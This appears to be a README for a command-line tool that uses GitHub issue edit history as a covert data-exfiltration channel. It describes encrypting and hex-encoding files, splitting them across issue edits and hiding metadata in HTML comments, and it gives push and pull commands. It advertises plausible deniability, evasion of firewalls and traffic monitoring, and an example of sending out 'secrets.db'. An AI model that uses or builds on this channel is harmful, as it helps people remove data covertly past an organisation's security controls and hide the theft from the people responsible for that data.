```
     ____  __  ___________    ________          __
    / __ \/ /_/ ____/ ___/   / ____/ /_  ____ _/ /________
   / / / / __/ __/  \__ \   / / __/ __ \/ __ `/ __/ ___(_)
  / /_/ / /_/ /___ ___/ /  / /_/ / / / / /_/ / /_(__  )
 /_____/\__/_____//____/   \____/_/ /_/\____/\__/____(_)
      Data Through Edit Streams  //  github issues as covert channel
```

<p align="center">
<b>Covert data exfiltration channel hidden in plain sight inside GitHub issue edit history.</b><br>
<sub>GPG-encrypted. Hex-encoded. Chunk-split across edits. MD5-verified. Zero additional infrastructure.</sub>
</p>

---

> *"The best place to hide data is where everyone can see it but nobody looks."*

## What is this

A steganographic data pipeline that abuses GitHub's issue edit history as a bidirectional encrypted file transfer channel. Data is encrypted, sliced into chunks, and pushed as successive issue body edits. To anyone glancing at the issue, it looks like garbled text. To the receiver, it reassembles into the original file -- verified, decrypted, extracted.

No servers. No S3 buckets. No suspicious traffic. Just GitHub issues doing what they always do.

```
 SENDER                          GITHUB                          RECEIVER
 ------                          ------                          --------
 file.tar.gz                     Issue #42                       pull.py issue 42
   |                               |                                |
   +-> gpg encrypt                 |                                |
   +-> hex encode            body: [chunk 0]                        |
   +-> split 62,464 chars    edit: [chunk 1]    <-- edit history    |
   +-> push.py               edit: [chunk 2]        looks like      +-> fetch edits (GraphQL)
                              edit: [chunk 3]        gibberish       +-> verify MD5 per-chunk
                              edit: [chunk N]                        +-> hex decode
                              comment: <!-- metadata -->             +-> gpg decrypt
                                                                     +-> tar extract
                                                                     |
                                                                   file.tar.gz
```

## Why GitHub issues

- **No infra**: no servers, no cloud storage, no port forwarding
- **Firewall-friendly**: HTTPS to github.com -- allowed everywhere
- **Plausible deniability**: looks like a normal issue with messy text
- **Edit history**: GitHub stores every body revision via GraphQL API, giving you unlimited sequential storage slots
- **Free**: unlimited issues, unlimited edits, unlimited comments
- **Encrypted at rest**: GPG before it ever touches the wire

## Features

```
 [+] One-command push/pull -- replaces 5-script manual workflow
 [+] GPG encryption with configurable keys
 [+] Exact 62,464 hex char chunking (matches GitHub body limit)
 [+] Per-chunk MD5 + full archive MD5 verification
 [+] Metadata hidden in HTML comments (invisible in GitHub UI)
 [+] GraphQL cursor pagination (handles 50+ edit issues)
 [+] Dry-run mode for offline testing
 [+] Resume support for interrupted transfers
 [+] Legacy backward compatibility
```

## Quickstart

```bash
git clone <this-repo> && cd DownloadIssues
uv sync
cp .env.example .env
# set GITHUB_TOKEN and GITHUB_REPO in .env
```

### Push (send data)

```bash
# encrypt and push a file to a new GitHub issue
python push.py /path/to/secrets.db

# encrypt a whole directory
python push.py ./project-backup/ -k my-gpg-key

# test locally without touching GitHub
python push.py ./data --dry-run -o /tmp/test
```

### Pull (receive data)

```bash
# list available transfers
python pull.py list

# download, verify MD5, decrypt, extract -- one command
python pull.py issue 35 -o ./received/

# just grab the hex (skip decryption)
python pull.py issue 35 --hex-only
```

### Server-side (no Python available)

```bash
# encrypt + chunk + generate MD5 manifest
./archive-encrypt-v2.sh /path/to/folder -k neanderthal
# outputs: *.hex files + *.manifest.json
# manually paste hex chunks as issue body edits
# paste manifest.json as the first comment
```

## Data Format

```
Issue body:    [last chunk -- what you see on the page]
Edit history:  [chunk N-1] [chunk N-2] ... [chunk 0]  (newest-first)
Comment #1:    <!-- DT-METADATA {"parts":[...], "archive_md5":"..."} DT-METADATA -->
```

Each edit = exactly **62,464 hex chars** (last chunk may be shorter). Metadata is invisible in the GitHub UI -- wrapped in an HTML comment.

Reconstruction: `reversed(edits)` = full hex stream -> `xxd -r -p` -> GPG decrypt -> `tar xzf`

## Architecture

```
DownloadIssues/
|
|-- push.py                    # Encrypt + chunk + push to GitHub issue
|-- pull.py                    # Download + verify + decrypt (list/issue/all)
|
|-- lib/
|   |-- config.py              # GITHUB_TOKEN, GITHUB_REPO, GPG_KEY, chunk size
|   |-- github_api.py          # REST + GraphQL with cursor pagination
|   |-- crypto.py              # tar/gpg/hex/split via subprocess
|   |-- integrity.py           # MD5 hashing + per-chunk verification
|   |-- metadata.py            # JSON metadata in HTML comments
|
|-- archive-encrypt-v2.sh      # Server-side: correct chunking + MD5 manifest
|-- decrypt-restore.sh         # Manual hex -> binary -> gpg -> tar
|-- archive-encrypt.sh         # Legacy encrypt (50KB binary split)
|-- download_issues.py         # Legacy issue downloader
|-- extract_hex_from_edits.py  # Legacy hex extractor
```

## CLI Reference

### push.py

```
python push.py <target> [-k KEY] [--repo REPO] [--issue N] [--dry-run] [--delay SEC] [-o DIR]
```

| Flag | Effect |
|------|--------|
| `-k KEY` | GPG key (default: `neanderthal`) |
| `--issue N` | Resume to existing issue |
| `--dry-run` | Encrypt locally, no API calls |
| `--delay N` | Seconds between edits (default: 2.0) |
| `-o DIR` | Output dir for dry-run |

### pull.py

```
python pull.py list
python pull.py issue <N> [-o DIR] [--force] [--hex-only] [--no-label]
python pull.py all [-o DIR] [--force]
```

| Flag | Effect |
|------|--------|
| `--force` | Ignore MD5 failures |
| `--hex-only` | Save hex, skip decrypt |
| `--no-label` | Don't tag issue as verified |

## Environment

```bash
# .env
GITHUB_TOKEN=ghp_...          # required -- repo scope
GITHUB_REPO=owner/repo        # required -- target repo for transfers
GPG_KEY=neanderthal            # optional -- default encryption key
```

## Operational Notes

- GitHub rate limit: 5000 req/hr with token, 60/hr without
- Each body edit = one API call. A 500KB file = ~8 edits. Use `--delay` to avoid rate limits
- Edit history is **permanent** -- even if you delete the issue, GitHub retains it internally
- Use private repos for anything sensitive
- Delete issues + revoke tokens after transfer
- The `[DT]` title prefix and `data-transfer` label are used for discovery by `pull.py list`

## License

Free to use and modify.
